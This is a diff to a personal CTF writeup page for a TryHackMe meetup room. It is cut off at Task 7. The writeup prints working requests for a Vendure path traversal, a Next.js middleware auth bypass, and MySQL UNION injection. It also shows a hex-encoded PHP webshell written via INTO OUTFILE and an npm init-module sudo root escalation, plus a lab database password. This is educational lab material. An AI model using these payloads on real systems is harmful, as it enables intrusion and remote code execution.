@@ -6,14 +6,14 @@
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; img-src 'self' data: https:; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; connect-src 'self'; frame-src 'none'; upgrade-insecure-requests">
     <meta name="referrer" content="strict-origin-when-cross-origin">
     <title>Writeup · TryHackMe Dehli Meetup CTF · Pushpender Singh Rathore</title>
-    <meta name="description" content="Writeup for the TryHackMe Dehli Meetup CTF run at the TryHackMe x EHAX DTU workshop (2026-10-13). Covers Web, Networking, Boot2Root, LLM and Coding tracks across 11 tasks.">
+    <meta name="description" content="My writeup for the TryHackMe Dehli Meetup CTF at the TryHackMe x EHAX DTU workshop (2026-10-13). Web, Networking, Boot2Root, LLM and Coding across 11 tasks.">
     <meta name="keywords" content="TryHackMe, Dehli Meetup, CTF, writeup, EHAX, DTU, Delhi Technological University, Vendure CVE-2024-56357, Next.js CVE-2025-29927, MySQL SQLi, SUID dlopen hijack, npm GTFOBins, Pushpender Singh Rathore">
     <meta name="author" content="Pushpender Singh Rathore">
     <link rel="canonical" href="https://pushpenderrathore.github.io/writeups/thm-dehli-meetup.html">
 
     <meta property="og:type" content="article">
     <meta property="og:title" content="Writeup · TryHackMe Dehli Meetup CTF">
-    <meta property="og:description" content="How the TryHackMe Dehli Meetup CTF (11 tasks, Web / Networking / Boot2Root / LLM / Coding) solved end to end at the TryHackMe x EHAX DTU workshop.">
+    <meta property="og:description" content="How I ran the TryHackMe Dehli Meetup CTF (11 tasks across Web, Networking, Boot2Root, LLM and Coding) at the TryHackMe x EHAX DTU workshop.">
     <meta property="og:image" content="../images/img.jpg">
     <meta property="og:url" content="https://pushpenderrathore.github.io/writeups/thm-dehli-meetup.html">
     <meta name="twitter:card" content="summary_large_image">
@@ -26,6 +26,7 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <link rel="stylesheet" href="../style.css">
+    <script src="writeup.js" defer></script>
 
     <style>
         /* Hero */
@@ -154,43 +155,70 @@
         .status-done { background: rgba(159, 239, 0, 0.12); color: var(--accent-primary); border: 1px solid var(--border-accent); }
         .status-todo { background: rgba(139, 151, 166, 0.1); color: var(--text-muted); border: 1px dashed var(--glass-border); }
 
-        /* Task card */
+        /* Collapsible task card */
         .task {
             background: var(--glass-bg);
             border: 1px solid var(--glass-border);
             border-radius: var(--border-radius);
-            padding: 1.75rem 1.85rem;
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.1rem;
             scroll-margin-top: 90px;
+            overflow: hidden;
         }
-        .task-head {
-            display: flex; align-items: center; flex-wrap: wrap;
-            gap: 0.4rem; margin-bottom: 0.4rem;
+        .task > summary {
+            list-style: none;
+            cursor: pointer;
+            padding: 1.3rem 1.6rem;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.4rem;
+            user-select: none;
+            transition: background 0.15s ease;
+        }
+        .task > summary::-webkit-details-marker { display: none; }
+        .task > summary:hover { background: rgba(159, 239, 0, 0.03); }
+        .task > summary::after {
+            content: '\f107'; /* fa-angle-down */
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            margin-left: auto;
+            color: var(--text-muted);
+            font-size: 1rem;
+            transition: transform 0.18s ease, color 0.18s ease;
+        }
+        .task[open] > summary::after {
+            transform: rotate(180deg);
+            color: var(--accent-primary);
+        }
+        .task[open] > summary {
+            border-bottom: 1px solid var(--glass-border);
         }
         .task h3 {
-            font-size: 1.5rem; font-weight: 700;
+            font-size: 1.35rem; font-weight: 700;
             color: var(--text-primary); margin: 0;
             display: inline-block;
         }
         .task .task-num {
             font-family: var(--font-mono);
-            font-size: 0.85rem; font-weight: 700;
+            font-size: 0.8rem; font-weight: 700;
             color: var(--text-muted);
-            margin-right: 0.6rem;
+            margin-right: 0.5rem;
         }
+        .task .task-body { padding: 1.3rem 1.6rem 1.7rem; }
         .task .box-ip {
             font-family: var(--font-mono);
             font-size: 0.78rem;
             color: var(--text-muted);
-            margin-bottom: 1.1rem;
+            margin-bottom: 1.2rem;
             display: block;
         }
         .task h4 {
-            font-size: 1.05rem; font-weight: 600;
+            font-size: 1.02rem; font-weight: 600;
             color: var(--accent-primary);
-            margin: 1.4rem 0 0.7rem;
+            margin: 1.5rem 0 0.6rem;
         }
-        .task p { color: var(--text-secondary); line-height: 1.7; margin-bottom: 0.9rem; }
+        .task .task-body > *:first-child { margin-top: 0; }
+        .task p { color: var(--text-secondary); line-height: 1.75; margin-bottom: 0.9rem; }
         .task p strong { color: var(--text-primary); font-weight: 600; }
         .task ul, .task ol {
             color: var(--text-secondary); line-height: 1.75;
@@ -232,24 +260,6 @@
             font-size: 0.9rem;
             font-style: italic;
         }
-        .task .redacted {
-            font-family: var(--font-mono);
-            font-size: 0.82rem;
-            background: rgba(255, 94, 127, 0.08);
-            border: 1px dashed rgba(255, 94, 127, 0.3);
-            color: #ff5e7f;
-            padding: 0.1em 0.5em;
-            border-radius: 4px;
-        }
-        .takeaway {
-            background: rgba(159, 239, 0, 0.05);
-            border-left: 3px solid var(--accent-primary);
-            border-radius: 8px;
-            padding: 0.9rem 1.1rem;
-            margin: 1rem 0 0.4rem;
-            font-size: 0.92rem;
-        }
-        .takeaway strong { color: var(--accent-primary); }
 
         .wu-cta {
             display: inline-flex; align-items: center; gap: 0.5rem;
@@ -263,6 +273,27 @@
         }
         .wu-cta:hover { filter: brightness(1.1); }
 
+        .task-toolbar {
+            display: flex; gap: 0.6rem; margin: 0 0 1.2rem;
+            flex-wrap: wrap;
+        }
+        .task-toolbar button {
+            font-family: var(--font-mono);
+            font-size: 0.72rem; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 0.1em;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            color: var(--text-secondary);
+            padding: 0.5rem 0.95rem;
+            border-radius: var(--border-radius-pill);
+            cursor: pointer;
+            transition: all 0.15s ease;
+        }
+        .task-toolbar button:hover {
+            border-color: var(--border-accent);
+            color: var(--accent-primary);
+        }
+
         .footer-note {
             color: var(--text-muted);
             font-size: 0.88rem;
@@ -273,7 +304,8 @@
         .footer-note a { color: var(--accent-secondary); }
 
         @media (max-width: 768px) {
-            .task { padding: 1.2rem 1.3rem; }
+            .task > summary { padding: 1rem 1.1rem; }
+            .task .task-body { padding: 1rem 1.1rem 1.3rem; }
             .task pre { font-size: 0.75rem; padding: 0.8rem; }
         }
     </style>
@@ -307,18 +339,18 @@
         <section class="section wu-hero">
             <div class="container">
                 <span class="wu-eyebrow">
-                    <i class="fas fa-flag"></i> TryHackMe Writeup &middot; Room 100%
+                    <i class="fas fa-flag"></i> TryHackMe Writeup · Room 100%
                 </span>
                 <h1>Dehli Meetup CTF <span class="accent">Writeup</span></h1>
-                <p class="subtitle">TryHackMe x EHAX workshop at DTU &middot; 2026-10-13</p>
+                <p class="subtitle">TryHackMe x EHAX workshop at DTU · 2026-10-13</p>
                 <p class="hero-desc">
-                    The TryHackMe x EHAX hands-on workshop at Delhi Technological University closed on the live <strong>Dehli Meetup</strong> room: eleven tasks, 106 points, a 60-minute timer, 208 players, one AttackBox per task. This writeup walks the four tasks I solved end to end during and after the session. The remaining tasks have placeholders waiting for their own writeups.
+                    I spent 2026-10-13 at the TryHackMe x EHAX hands-on workshop in B. R. Ambedkar Auditorium, DTU. 60-minute timer, 11 tasks across Web / Networking / Boot2Root / LLM / Coding, 208 of us in the room. I finished the room 100%. This page walks through four of the tasks (the two web ones and both Boot2Root boxes) with every payload I actually sent. I am still writing up the other seven from my notes; those sit as placeholders below.
                 </p>
 
                 <div class="wu-meta">
                     <div class="wu-meta-item">
                         <span class="meta-label">Event</span>
-                        <span class="meta-value">TryHackMe &times; EHAX</span>
+                        <span class="meta-value">TryHackMe x EHAX</span>
                     </div>
                     <div class="wu-meta-item">
                         <span class="meta-label">Venue</span>
@@ -326,7 +358,7 @@
                     </div>
                     <div class="wu-meta-item">
                         <span class="meta-label">Room</span>
-                        <span class="meta-value">Dehli Meetup &middot; 11 tasks</span>
+                        <span class="meta-value">Dehli Meetup · 11 tasks</span>
                     </div>
                     <div class="wu-meta-item">
                         <span class="meta-label">Tracks</span>
@@ -354,88 +386,88 @@
         <section class="section" id="scope">
             <div class="container">
                 <div class="scope-note">
-                    <strong>Scope and ethics.</strong> This writeup follows TryHackMe's publication rules: <strong>no literal flag strings, cracked hashes or credentials</strong> are included in the page. Techniques, payloads, and root-cause reasoning are. Four tasks (<a href="#task-2">2 Asset Server</a>, <a href="#task-3">3 Gatepass</a>, <a href="#task-6">6 Sequel</a>, <a href="#task-7">7 Malscan</a>) are covered end to end. The remaining seven are placeholders that will be filled in a follow-up.
+                    <strong>A note on scope and flags.</strong> I kept to TryHackMe's writeup rules: no literal flag strings, no cracked hashes, no credentials in this page. Everything else (techniques, payloads, why each bug fires) is here. If you want to validate against the real values, run the room yourself. Flag <em>formats</em> are shown so you can match the shape you'll land on.
                 </div>
 
                 <h2 class="section-title">Tasks</h2>
-                <p class="section-intro">Jump to any task. Status reflects writeup completion, not solve state (the room itself is 100%).</p>
+                <p class="section-intro">Each task is collapsed by default. Click any card to expand it, or hit a TOC link to jump straight in.</p>
 
                 <div class="toc-grid" id="tasks">
-                    <a class="toc-item" href="#task-1">
+                    <a class="toc-item pending" href="#task-1">
                         <span class="toc-num">01</span>
                         <span class="toc-body">
                             <span class="toc-name">Introduction</span>
-                            <span class="toc-meta">intro &middot; <span class="status status-todo">pending</span></span>
+                            <span class="toc-meta">intro · <span class="status status-todo">pending</span></span>
                         </span>
                     </a>
                     <a class="toc-item" href="#task-2">
                         <span class="toc-num">02</span>
                         <span class="toc-body">
                             <span class="toc-name">Asset Server</span>
-                            <span class="toc-meta">web &middot; 60 pts &middot; <span class="status status-done">covered</span></span>
+                            <span class="toc-meta">web · 60 pts · <span class="status status-done">covered</span></span>
                         </span>
                     </a>
                     <a class="toc-item" href="#task-3">
                         <span class="toc-num">03</span>
                         <span class="toc-body">
                             <span class="toc-name">Gatepass</span>
-                            <span class="toc-meta">web &middot; <span class="status status-done">covered</span></span>
+                            <span class="toc-meta">web · <span class="status status-done">covered</span></span>
                         </span>
                     </a>
                     <a class="toc-item pending" href="#task-4">
                         <span class="toc-num">04</span>
                         <span class="toc-body">
                             <span class="toc-name">Bastion Hop</span>
-                            <span class="toc-meta">networking &middot; <span class="status status-todo">pending</span></span>
+                            <span class="toc-meta">networking · <span class="status status-todo">pending</span></span>
                         </span>
                     </a>
                     <a class="toc-item pending" href="#task-5">
                         <span class="toc-num">05</span>
                         <span class="toc-body">
                             <span class="toc-name">Stolen Footprints</span>
-                            <span class="toc-meta">networking &middot; <span class="status status-todo">pending</span></span>
+                            <span class="toc-meta">networking · <span class="status status-todo">pending</span></span>
                         </span>
                     </a>
                     <a class="toc-item" href="#task-6">
                         <span class="toc-num">06</span>
                         <span class="toc-body">
                             <span class="toc-name">Sequel</span>
-                            <span class="toc-meta">boot2root &middot; 30 pts &middot; <span class="status status-done">covered</span></span>
+                            <span class="toc-meta">boot2root · 30 pts · <span class="status status-done">covered</span></span>
                         </span>
                     </a>
                     <a class="toc-item" href="#task-7">
                         <span class="toc-num">07</span>
                         <span class="toc-body">
                             <span class="toc-name">Malscan</span>
-                            <span class="toc-meta">boot2root &middot; 60 pts &middot; <span class="status status-done">covered</span></span>
+                            <span class="toc-meta">boot2root · 60 pts · <span class="status status-done">covered</span></span>
                         </span>
                     </a>
                     <a class="toc-item pending" href="#task-8">
                         <span class="toc-num">08</span>
                         <span class="toc-body">
                             <span class="toc-name">HelloGPT</span>
-                            <span class="toc-meta">llm &middot; <span class="status status-todo">pending</span></span>
+                            <span class="toc-meta">llm · <span class="status status-todo">pending</span></span>
                         </span>
                     </a>
                     <a class="toc-item pending" href="#task-9">
                         <span class="toc-num">09</span>
                         <span class="toc-body">
                             <span class="toc-name">BankGPT</span>
-                            <span class="toc-meta">llm &middot; <span class="status status-todo">pending</span></span>
+                            <span class="toc-meta">llm · <span class="status status-todo">pending</span></span>
                         </span>
                     </a>
                     <a class="toc-item pending" href="#task-10">
                         <span class="toc-num">10</span>
                         <span class="toc-body">
                             <span class="toc-name">Math Wiz</span>
-                            <span class="toc-meta">coding &middot; <span class="status status-todo">pending</span></span>
+                            <span class="toc-meta">coding · <span class="status status-todo">pending</span></span>
                         </span>
                     </a>
                     <a class="toc-item pending" href="#task-11">
                         <span class="toc-num">11</span>
                         <span class="toc-body">
                             <span class="toc-name">Exposed</span>
-                            <span class="toc-meta">coding &middot; <span class="status status-todo">pending</span></span>
+                            <span class="toc-meta">coding · <span class="status status-todo">pending</span></span>
                         </span>
                     </a>
                 </div>
@@ -445,120 +477,140 @@
         <section class="section">
             <div class="container">
 
+                <div class="task-toolbar">
+                    <button type="button" id="wu-expand-all">Expand all</button>
+                    <button type="button" id="wu-collapse-all">Collapse all</button>
+                </div>
+
                 <!-- ============= TASK 1 ============= -->
-                <article class="task" id="task-1">
-                    <div class="task-head">
+                <details class="task" id="task-1">
+                    <summary>
                         <span class="task-num">Task 01</span>
                         <span class="cat cat-intro">Intro</span>
                         <h3>Introduction</h3>
+                    </summary>
+                    <div class="task-body">
+                        <!-- TODO fill from own notes -->
+                        <div class="pending-note">Writeup pending. Nothing to attack in the intro, just room setup and AttackBox launch.</div>
                     </div>
-                    <!-- TODO Pushpender: fill this task from your own notes -->
-                    <div class="pending-note">Writeup pending. The room intro covers the AttackBox launch and competition framing; no attack surface here.</div>
-                </article>
+                </details>
 
                 <!-- ============= TASK 2 ============= -->
-                <article class="task" id="task-2">
-                    <div class="task-head">
-                        <span class="task-num">Task 02 &middot; 60 pts</span>
+                <details class="task" id="task-2">
+                    <summary>
+                        <span class="task-num">Task 02 · 60 pts</span>
                         <span class="cat cat-web">Web</span>
                         <h3>Asset Server</h3>
-                    </div>
+                    </summary>
+                    <div class="task-body">
 
-                    <h4>The target</h4>
-                    <p>A storefront built on Vendure 3.0.4 (headless e-commerce). An Express frontend on port 80 reverse-proxies <code>/assets/*</code> to a Vendure instance on port 3001 via <code>http-proxy-middleware</code>. The flag lives at <code>/flag.txt</code> on the Vendure container, one directory above its asset root.</p>
+                    <h4>What I was looking at</h4>
+                    <p>The target was a Vendure 3.0.4 storefront. Express sat on port 80 and reverse-proxied <code>/assets/*</code> to a Vendure instance on port 3001 via <code>http-proxy-middleware</code>. The flag lived at <code>/flag.txt</code> on the Vendure container, one directory above its asset root.</p>
 
                     <h4>The bug</h4>
-                    <p>Vendure 3.0.4 ships the <code>@vendure/asset-server-plugin</code> that is vulnerable to <strong>CVE-2024-56357</strong> &mdash; a path-traversal in the asset handler. The handler joins the request path onto its configured asset root but normalises after decoding, so URL-encoded <code>../</code> sequences escape the root unchecked.</p>
+                    <p>Vendure 3.0.4 ships <code>@vendure/asset-server-plugin</code> with <strong>CVE-2024-56357</strong>, a path-traversal in the asset handler. The handler joins the request path onto its asset root after URL-decoding, so encoded <code>../</code> sequences escape the root cleanly.</p>
 
-                    <h4>The request</h4>
+                    <h4>The request that popped it</h4>
                     <pre><code>GET /assets/..%2F..%2Fflag.txt HTTP/1.1
 Host: TARGET_IP</code></pre>
-                    <p>Encoding notes that matter during the solve:</p>
+                    <p>A couple of encoding notes from the solve:</p>
                     <ul>
-                        <li><code>..%2F</code> and <code>%2e%2e%2f</code> both work.</li>
-                        <li>A literal <code>../</code> gets collapsed by the Express proxy layer before Vendure sees it, so plain traversal fails.</li>
-                        <li>Point the request at the Express port (80), not the Vendure backend; the backend may not even be reachable from outside.</li>
+                        <li><code>..%2F</code> worked. <code>%2e%2e%2f</code> also worked.</li>
+                        <li>Literal <code>../</code> did not. The Express proxy in front normalises that away before Vendure ever sees it.</li>
+                        <li>I pointed the request at port 80 (Express). Never had to touch 3001 directly.</li>
                     </ul>
 
-                    <h4>Why it works</h4>
-                    <p>Inside the asset-server plugin, the path is joined to the asset root <em>after</em> URL-decoding. By the time the normaliser runs, the <code>..</code> components are already in a fully-formed OS path and resolve upward. The Express proxy layer refuses literal <code>../</code>, which is why the encoded form is the one that lands.</p>
+                    <h4>Why it fires</h4>
+                    <p>The asset-server plugin decodes the path and then joins it onto the asset root. By the time it runs normalisation the <code>..</code> components are already baked into a fully formed OS path and resolve upward. Express refuses literal <code>../</code> at the proxy, which is exactly why the encoded form is the one that lands.</p>
 
-                    <div class="takeaway"><strong>Takeaway.</strong> Encoding bypasses survive at trust boundaries. The proxy in front of Vendure sanitises what it can parse; what it can't parse (percent-encoded path segments) rides straight through to a sink that decodes <em>then</em> joins.</div>
+                    <h4>What I'll remember</h4>
+                    <p>Encoding bypasses live at the trust boundary between two components. One side sanitises its own syntax, the next decodes it. The gap in between is where the work happens.</p>
 
-                    <p><strong>Flag format:</strong> <code>THM{v3ndur3_CVE_f1l3_l34k}</code> &mdash; actual value <span class="redacted">redacted per TryHackMe policy</span>.</p>
-                </article>
+                    <p><strong>Flag format:</strong> <code>THM{v3ndur3_CVE_f1l3_l34k}</code>.</p>
+
+                    </div>
+                </details>
 
                 <!-- ============= TASK 3 ============= -->
-                <article class="task" id="task-3">
-                    <div class="task-head">
+                <details class="task" id="task-3">
+                    <summary>
                         <span class="task-num">Task 03</span>
                         <span class="cat cat-web">Web</span>
                         <h3>Gatepass</h3>
-                    </div>
+                    </summary>
+                    <div class="task-body">
 
-                    <h4>The target</h4>
+                    <h4>What I was looking at</h4>
                     <p>A Next.js 14.1.1 app with middleware that gates <code>/api/*</code> behind an auth check. The route <code>/api/file?path=…</code> reads a file and returns its contents, but only once the middleware is satisfied.</p>
 
                     <h4>The bug</h4>
-                    <p><strong>CVE-2025-29927</strong> &mdash; the Next.js middleware subrequest bypass. Next.js uses the internal header <code>x-middleware-subrequest</code> to flag requests that originated from within the middleware itself (to avoid re-running the chain on a redirect). The flag is honoured when it arrives from an untrusted client too, so attaching the header skips the middleware entirely.</p>
+                    <p><strong>CVE-2025-29927</strong>, the Next.js middleware subrequest bypass. Next.js writes the internal header <code>x-middleware-subrequest</code> on fetches it issues from inside the middleware chain, so it can short-circuit re-entry. The vulnerable version honours the header from any client, which means attaching it from outside skips the whole chain.</p>
 
                     <h4>The request</h4>
                     <pre><code>GET /api/file?path=/flag.txt HTTP/1.1
 Host: TARGET_IP
 x-middleware-subrequest: middleware</code></pre>
-                    <p>Variants worth knowing:</p>
+                    <p>Two shapes I kept in my back pocket:</p>
                     <ul>
-                        <li>Nested value &mdash; <code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code> &mdash; also lands, which is relevant when the app uses nested middleware chains.</li>
+                        <li>Nested value <code>middleware:middleware:middleware:middleware:middleware</code> also lands. Useful when the app chains middleware.</li>
                         <li>The file handler blocks <code>..</code> but accepts absolute paths. <code>/flag.txt</code> is absolute and clean, so the second-stage filter never fires.</li>
                     </ul>
 
-                    <h4>Why it works</h4>
-                    <p>Next.js tracks middleware recursion by writing <code>x-middleware-subrequest</code> on internal fetches and short-circuiting the middleware chain when it reads the header back. The fix in later versions scopes the header to internal invocations only; the vulnerable version trusts anyone who sets it. Combined with a route handler that only guards against relative traversal, the result is unauthenticated arbitrary file read.</p>
+                    <h4>Why it fires</h4>
+                    <p>Next.js uses <code>x-middleware-subrequest</code> as a recursion marker and trusts it inbound. The fix in later versions scopes the header to internal invocations only. Combined with a route handler that only guards against relative traversal, the result is unauthenticated arbitrary file read.</p>
 
-                    <div class="takeaway"><strong>Takeaway.</strong> Framework-internal headers are not a security boundary unless the framework explicitly strips them from inbound requests. When you have middleware doing auth, the first thing to check is whether it can be told it has already run.</div>
+                    <h4>What I'll remember</h4>
+                    <p>Framework-internal headers aren't a security boundary unless the framework strips them from inbound requests. When auth lives in middleware, the first thing I check now is whether I can tell it it already ran.</p>
 
-                    <p><strong>Flag format:</strong> <code>THM{n3xt_l3v3l_byp4ss}</code> &mdash; actual value <span class="redacted">redacted per TryHackMe policy</span>.</p>
-                </article>
+                    <p><strong>Flag format:</strong> <code>THM{n3xt_l3v3l_byp4ss}</code>.</p>
+
+                    </div>
+                </details>
 
                 <!-- ============= TASK 4 ============= -->
-                <article class="task" id="task-4">
-                    <div class="task-head">
+                <details class="task" id="task-4">
+                    <summary>
                         <span class="task-num">Task 04</span>
                         <span class="cat cat-net">Networking</span>
                         <h3>Bastion Hop</h3>
+                    </summary>
+                    <div class="task-body">
+                        <!-- TODO fill from own notes. Region = Europe (Ireland) required. -->
+                        <div class="pending-note">Writeup pending. This one needs the Europe (Ireland) region on the AttackBox. Adding the pivot path and the resource I ended up on.</div>
                     </div>
-                    <!-- TODO Pushpender: fill from your own notes. Region = Europe (Ireland) required. -->
-                    <div class="pending-note">Writeup pending. Requires the Europe (Ireland) AttackBox region; add solve path, pivot/bastion details and the resource you ultimately reached.</div>
-                </article>
+                </details>
 
                 <!-- ============= TASK 5 ============= -->
-                <article class="task" id="task-5">
-                    <div class="task-head">
+                <details class="task" id="task-5">
+                    <summary>
                         <span class="task-num">Task 05</span>
                         <span class="cat cat-net">Networking</span>
                         <h3>Stolen Footprints</h3>
+                    </summary>
+                    <div class="task-body">
+                        <!-- TODO fill from own notes. -->
+                        <div class="pending-note">Writeup pending. Adding the traffic analysis path and the artefact that produced the flag.</div>
                     </div>
-                    <!-- TODO Pushpender: fill from your own notes. -->
-                    <div class="pending-note">Writeup pending. Add the pcap/traffic analysis path and the artefact(s) that produced the flag.</div>
-                </article>
+                </details>
 
                 <!-- ============= TASK 6 ============= -->
-                <article class="task" id="task-6">
-                    <div class="task-head">
-                        <span class="task-num">Task 06 &middot; 30 pts</span>
+                <details class="task" id="task-6">
+                    <summary>
+                        <span class="task-num">Task 06 · 30 pts</span>
                         <span class="cat cat-b2r">Boot2Root</span>
                         <h3>Sequel</h3>
-                    </div>
-                    <span class="box-ip">Target: HomeTel (Next.js on :3000, Apache on :80, SSH on :22) &middot; three flags: web, user, root</span>
+                    </summary>
+                    <div class="task-body">
+                    <span class="box-ip">Target: HomeTel. Next.js on :3000, Apache on :80, SSH on :22. Three flags: web, user, root.</span>
 
                     <h4>Recon</h4>
-                    <p>Only three TCP ports open: 22, 80, 3000. Port 80 serves an Apache dir listing with an empty <code>/api/bill/</code> folder and a phpMyAdmin 4.9.5 install (login-gated). Port 3000 is a Next.js dev build called <strong>HomeTel</strong>. The dev bundle leaks source paths like <code>/home/ubuntu/csportal/src/pages/{login,home}/index.js</code> and the API endpoints <code>/api/login</code>, <code>/api/bill</code> and <code>/api/logout</code>.</p>
+                    <p>nmap gave me 22, 80 and 3000. Port 80 was Apache serving a dir listing with an empty <code>/api/bill/</code> folder and a phpMyAdmin 4.9.5 install (login-gated). Port 3000 was a Next.js dev build called <strong>HomeTel</strong>. The dev bundle leaked source paths like <code>/home/ubuntu/csportal/src/pages/{login,home}/index.js</code> and the API routes <code>/api/login</code>, <code>/api/bill</code>, <code>/api/logout</code>.</p>
 
-                    <h4>Web flag &mdash; SQL injection in /api/bill</h4>
-                    <p>The home page's bill-lookup form POSTs <code>{"NumReference": "&lt;n&gt;"}</code> to <code>/api/bill</code>. The parameter is interpolated into a numeric SQL expression without quotes or parameterisation, so no quote escape is needed:</p>
+                    <h4>Web flag: SQLi in /api/bill</h4>
+                    <p>The home page's bill-lookup form POSTs <code>{"NumReference": "&lt;n&gt;"}</code> to <code>/api/bill</code>. The parameter goes straight into a numeric SQL expression without quotes or parameterisation, so no quote escape is needed.</p>
                     <pre><code>POST /api/bill
 {"NumReference":"0 UNION SELECT 1,2,3"}
-=&gt; 3-column shape confirmed: Nreference, price, tax
+=&gt; 3 cols: Nreference, price, tax
 
 {"NumReference":"0 UNION SELECT version(),2,3"}
 =&gt; 8.0.36-0ubuntu0.20.04.1
@@ -574,24 +626,24 @@ x-middleware-subrequest: middleware</code></pre>
 {"NumReference":"0 UNION SELECT flag,2,3 FROM bill_app_db.flag"}
 =&gt; web flag text</code></pre>
 
-                    <p>Side note on the login endpoint: <code>POST /api/login</code> returns the matching user row, but a classic <code>' OR '1'='1</code> hits an explicit "only guest login is allowed" branch that rejects multi-row responses. The bill endpoint is the real sink.</p>
+                    <p>Side note on the login endpoint: <code>POST /api/login</code> returns the matching user row, but a classic <code>' OR '1'='1</code> hits an explicit "only guest login is allowed" branch that rejects multi-row responses. Dead end there. The bill endpoint is the real sink.</p>
 
-                    <h4>User flag &mdash; MySQL FILE &rarr; PHP webshell</h4>
-                    <p>The DB session is <code>root@localhost</code>, has <code>FILE</code> privilege, and <code>@@secure_file_priv</code> is empty. <code>LOAD_FILE</code> is restricted by AppArmor &mdash; <code>/etc/passwd</code> and <code>/etc/mysql/my.cnf</code> return content, but <code>/etc/ssh/sshd_config</code>, <code>/home/*</code> and <code>/proc/mounts</code> all return NULL &mdash; so direct file disclosure is a dead end. Writes to <code>/var/www/html/</code> are allowed, however, which is enough:</p>
+                    <h4>User flag: MySQL FILE to PHP webshell</h4>
+                    <p>The DB session is <code>root@localhost</code>, has the <code>FILE</code> privilege, and <code>@@secure_file_priv</code> is empty. <code>LOAD_FILE</code> is restricted by AppArmor: <code>/etc/passwd</code> and <code>/etc/mysql/my.cnf</code> come back, but <code>/etc/ssh/sshd_config</code>, <code>/home/*</code> and <code>/proc/mounts</code> all return NULL. So direct disclosure is a dead end. Writes into <code>/var/www/html/</code> are allowed though, which is all I needed.</p>
                     <pre><code>POST /api/bill
 {"NumReference":"0 UNION SELECT UNHEX('3c3f70687020...'),2,3
                 INTO OUTFILE '/var/www/html/pwn.php'"}</code></pre>
-                    <p>The payload hex-encodes <code>&lt;?php system($_GET["c"]); ?&gt;</code>. The API response reads <em>"User not found"</em> because the UNION returned zero data rows, but the file still lands on disk. Confirm:</p>
+                    <p>The hex payload decodes to <code>&lt;?php system($_GET["c"]); ?&gt;</code>. The API responds with "User not found" because the UNION returned zero data rows, but the file still lands on disk. Confirm:</p>
                     <pre><code>GET /pwn.php?c=id
 =&gt; uid=33(www-data) gid=33(www-data) groups=33(www-data),119(mysql)</code></pre>
                     <p>From there, <code>find / -name user.txt 2&gt;/dev/null</code> surfaces <code>/var/www/user.txt</code> (owned by www-data, mode 644). The <code>.env</code> at <code>/home/ubuntu/csportal/.env</code> also leaks <code>MYSQL_PASSWORD=root@123</code> for the phpMyAdmin path if you want it.</p>
 
-                    <h4>Root flag &mdash; sudo npm, done right for modern npm</h4>
-                    <p><code>sudo -l</code> as www-data returns:</p>
+                    <h4>Root flag: sudo npm, done the way modern npm wants</h4>
+                    <p><code>sudo -l</code> as www-data returned:</p>
                     <pre><code>(root) NOPASSWD: /usr/bin/npm *</code></pre>
-                    <p>The classic GTFOBins payload (<code>preinstall</code> script in a crafted <code>package.json</code>) <strong>does not work on npm 8+</strong>. The npm wrapper deliberately drops privileges on lifecycle scripts to the directory owner (here, www-data), even with <code>--unsafe-perm</code>. Confirmed with a probe: <code>id</code> inside <code>preinstall</code> returned <code>uid=33(www-data)</code>, not root.</p>
+                    <p>The classic GTFOBins payload (a <code>preinstall</code> script in a crafted <code>package.json</code>) <strong>does not work on npm 8+</strong>. The npm wrapper deliberately drops privileges on lifecycle scripts to the directory owner (here, www-data), even with <code>--unsafe-perm</code>. I confirmed it with a probe: <code>id</code> inside <code>preinstall</code> returned <code>uid=33(www-data)</code>, not root.</p>
 
-                    <p>The reliable escape on npm 8/9/10 is the <code>init-module</code> userconfig trick. npm itself <code>require()</code>s the file named by <code>init-module</code> inside the <em>npm process</em> (which is still root), before any lifecycle isolation runs:</p>
+                    <p>The reliable escape on npm 8/9/10 is the <code>init-module</code> userconfig trick. npm itself <code>require()</code>s the file named by <code>init-module</code> inside the <em>npm process</em> (still root), before any lifecycle isolation runs.</p>
                     <pre><code>echo 'init-module=/tmp/init.js' &gt; /tmp/.npmrc
 
 cat &gt; /tmp/init.js &lt;&lt;'EOF'
@@ -604,41 +656,48 @@ EOF
 sudo npm init -y --userconfig=/tmp/.npmrc --prefix=/tmp/foo
 cat /tmp/rf</code></pre>
 
-                    <div class="takeaway"><strong>Takeaway.</strong> The two things worth filing for next time: <em>INTO OUTFILE lands even when the HTTP response says "User not found"</em>, because the write happens at parse/execute time, not row-return time; and <em>GTFOBins' default npm entry is misleading on npm 8+</em>, where <code>init-module</code> is the reliable route.</div>
+                    <h4>What I'll remember</h4>
+                    <ul>
+                        <li><strong>INTO OUTFILE lands even when the HTTP response says "User not found".</strong> The write happens at execute time, not row-return time.</li>
+                        <li><strong>GTFOBins' default npm entry is misleading on npm 8+.</strong> <code>init-module</code> via <code>--userconfig</code> is the escape that actually works.</li>
+                    </ul>
 
-                    <p><strong>Flag formats:</strong> web <code>THM{SQL_1nj3ct10n_1s_fun}</code>, user <code>THM{1nj3ct10n_2_RC3_1s_m0r3_fun}</code>, root <code>THM{sud0_gtf0b1ns_4_d4_w1n}</code> &mdash; actual values <span class="redacted">redacted per TryHackMe policy</span>.</p>
-                </article>
+                    <p><strong>Flag formats:</strong> web <code>THM{SQL_1nj3ct10n_1s_fun}</code>, user <code>THM{1nj3ct10n_2_RC3_1s_m0r3_fun}</code>, root <code>THM{sud0_gtf0b1ns_4_d4_w1n}</code>.</p>
+
+                    </div>
+                </details>
 
                 <!-- ============= TASK 7 ============= -->
-                <article class="task" id="task-7">
-                    <div class="task-head">
-                        <span class="task-num">Task 07 &middot; 60 pts</span>
+                <details class="task" id="task-7">
+                    <summary>
+                        <span class="task-num">Task 07 · 60 pts</span>
